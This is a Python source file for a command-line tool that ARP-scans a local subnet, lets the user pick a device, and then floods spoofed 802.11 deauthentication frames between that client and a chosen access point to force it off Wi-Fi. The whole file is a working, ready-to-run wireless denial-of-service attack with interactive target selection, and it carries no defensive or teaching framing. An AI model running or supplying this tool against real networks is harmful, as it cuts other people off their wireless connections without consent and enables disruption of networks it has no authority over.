from scapy.all import ARP, Ether, srp, sendp, Dot11, Dot11Deauth, RadioTap, conf
import time
import ipaddress
import re
import colorama
from colorama import Fore, Style
import argparse

def get_default_gateway():
    """Gets the default gateway IP address."""
    try:
        route = conf.route.route("0.0.0.0")
        if route and len(route) >= 3:
            return route[2]
    except Exception as e:
        print(f"{Fore.RED}[-] Could not get default gateway: {e}{Style.RESET_ALL}")
    return None

def scan(interface, subnet):
    """Quick ARP scan — returns list of (ip, mac) tuples"""
    if not subnet:
        print(f"{Fore.RED}[-] Cannot scan without a subnet.{Style.RESET_ALL}")
        return []
    print(f"{Fore.BLUE}[*] Scanning {subnet} via {interface} ...{Style.RESET_ALL}")
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
            timeout=3,
            iface=interface,
            verbose=0
        )
        devices = [(pkt[1].psrc, pkt[1].hwsrc) for _, pkt in ans]
        
        if not devices:
            print(f"{Fore.YELLOW}[-] No devices replied. Check interface, privileges, and network.{Style.RESET_ALL}")
            return []
            
        print(f"\n  {Fore.GREEN}IP              MAC{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}────────────────────────────────{Style.RESET_ALL}")
        for ip, mac in sorted(devices):
            print(f"  {ip:15}  {mac}")
        print()
        
        return devices
    except OSError as e:
        print(f"{Fore.RED}[-] {e.__class__.__name__}: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    → Hints: Are you running as root? Is the interface name correct?{Style.RESET_ALL}")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] An unexpected error occurred during scan: {e}{Style.RESET_ALL}")
        return []


def deauth(target_mac, ap_mac, iface, count=200, inter=0.08):
    """Send 802.11 deauth frames both directions"""
    print(f"{Fore.BLUE}[*] Starting deauthentication on {target_mac} via {ap_mac}{Style.RESET_ALL}")
    print(f"{Style.DIM}    (Sending {count} frames each way, press Ctrl+C to stop){Style.RESET_ALL}")

    pkt_to_client = (
        RadioTap() /
        Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )
    
    pkt_to_ap = (
        RadioTap() /
        Dot11(addr1=ap_mac, addr2=target_mac, addr3=ap_mac) /
        Dot11Deauth(reason=7)
    )

    try:
        for i in range(count):
            sendp(pkt_to_client, iface=iface, count=1, verbose=0)
            sendp(pkt_to_ap,     iface=iface, count=1, verbose=0)
            if (i+1) % 20 == 0:
                print(f"{Style.DIM}  Sent {i+1:3}/{count} packets...{Style.RESET_ALL}", end="\r")
            time.sleep(inter)
        print(f"\n{Fore.GREEN}[+] Finished sending {count}×2 frames.{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[+] Deauth attack stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[-] Failed to send deauth frames: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}    → Hints: Is the interface in monitor mode? Are you root? Is the driver correct?{Style.RESET_ALL}")

def is_valid_mac(mac):
    """Validates a MAC address format."""
    return re.match(r"^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$", mac)

def main():
    """Main function to run the network scanner and deauthenticator."""
    colorama.init(autoreset=True)
    parser = argparse.ArgumentParser(description="Network scanner and deauthentication tool.")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., wlan0mon, mon0)")
    args = parser.parse_args()
    iface = args.interface
    
    gateway = get_default_gateway()
    default_subnet = ""
    if gateway:
        try:
            network = ipaddress.ip_network(f"{gateway}/24", strict=False)
            default_subnet = str(network)
        except ValueError:
            pass

    prompt = f"{Fore.YELLOW}Enter subnet to scan [{default_subnet}]: {Style.RESET_ALL}"
    subnet = input(prompt).strip() or default_subnet
    
    devices = scan(iface, subnet)
    
    if not devices:
        print(f"{Fore.RED}[-] No devices found. Exiting.{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}--- Deauthentication Setup ---{Style.RESET_ALL}")
    print("Choose a target from the scan results (enter number) or provide a MAC address directly.")
    for i, (ip, mac) in enumerate(devices, 1):
        print(f"  {i:2})  {mac}   ({ip})")
    
    choice = input(f"\n{Fore.YELLOW}Target MAC or number: {Style.RESET_ALL}").strip()
    
    target_mac = ""
    if choice.isdigit() and 1 <= int(choice) <= len(devices):
        _, target_mac = devices[int(choice)-1]
    elif is_valid_mac(choice):
        target_mac = choice.lower()
    else:
        print(f"{Fore.RED}[-] Invalid selection or MAC format. Exiting.{Style.RESET_ALL}")
        return
        
    print(f"{Fore.GREEN}[+] Target selected: {target_mac}{Style.RESET_ALL}")

    ap_mac = ""
    while not is_valid_mac(ap_mac):
        ap_mac = input(f"{Fore.YELLOW}Enter the AP/Router's BSSID (MAC Address): {Style.RESET_ALL}").strip().lower()
        if not is_valid_mac(ap_mac):
            print(f"{Fore.RED}[-] Invalid MAC address format. Please try again (e.g., 00:11:22:33:44:55).{Style.RESET_ALL}")
    
    try:
        count_str = input(f"{Fore.YELLOW}How many deauth frames to send (each way) [200]: {Style.RESET_ALL}").strip()
        count = int(count_str) if count_str else 200
    except ValueError:
        print(f"{Fore.RED}[-] Invalid number, using default of 200.{Style.RESET_ALL}")
        count = 200
    
    deauth(target_mac, ap_mac, iface, count=count)


if __name__ == "__main__":
    main()
